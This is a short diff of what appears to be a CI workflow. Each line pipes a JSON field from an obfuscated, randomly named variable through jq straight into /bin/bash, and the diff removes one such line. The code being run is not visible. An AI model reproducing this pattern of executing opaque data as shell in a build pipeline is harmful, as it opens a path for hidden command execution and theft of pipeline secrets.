@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$in4" | jq -r .ki551 | /bin/bash
           echo $isc99494 | jq -r .s26474 | /bin/bash
           echo $v53 | jq -r .ryn56 | /bin/bash
-          echo $agtud81 | jq -r .gag21 | /bin/bash
           echo $ub611 | jq -r .clsb185 | /bin/bash
           echo $mjcy99 | jq -r .efdcz31 | /bin/bash
           printf '%s' "$yuez41482" | jq -r .c711 | /bin/bash
